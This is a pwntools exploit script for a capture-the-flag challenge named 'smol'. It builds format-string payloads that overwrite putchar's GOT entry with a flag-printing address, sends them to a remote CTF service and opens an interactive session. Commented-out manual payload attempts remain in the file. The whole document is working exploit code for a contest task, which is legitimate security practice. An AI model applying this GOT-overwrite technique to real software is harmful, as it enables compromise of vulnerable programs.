from pwn import *

local = False

host, port = 'pwn.utctf.live',5004

p = ELF('./smol')
r = process('./smol') if local else remote(host, port)

flag_instr = 0x401349


def send_data(data):
	r.recvuntil('?')
	log.info("sending big data")
	r.sendline(data)

def send_payload(data):
	r.recvuntil('data')
	log.info("sending malicous payload")
	r.sendline(data)



if __name__=='__main__':
	context.clear(arch = 'amd64')
	print(fmtstr_payload(6,{p.got['putchar']: 0x10}))
	#payload = fmtstr_payload(6, {p.got['putchar']: 0xc0ffee})
	#send_data(p64(p.got['putchar'])+p64(p.got['putchar']+1)+p64(p.got['putchar']+2)+b'a'*88+b'%6$n,%7$n,%8$n')
	#send_data(p64(p.got['putchar'])+b'a'*100+b'%238c%6$n%17c%7$hhn%193c%8$hhnaa\x18@@\x00\x19@@\x00\x1a@@\x00')
	
	payl = fmtstr_payload(6,{p.got['putchar']: flag_instr})
	
	send_data(payl+b'a'*(112-len(payl))+payl)

	#send_data(b'a'*104+payload)
	send_payload('')
	r.interactive()








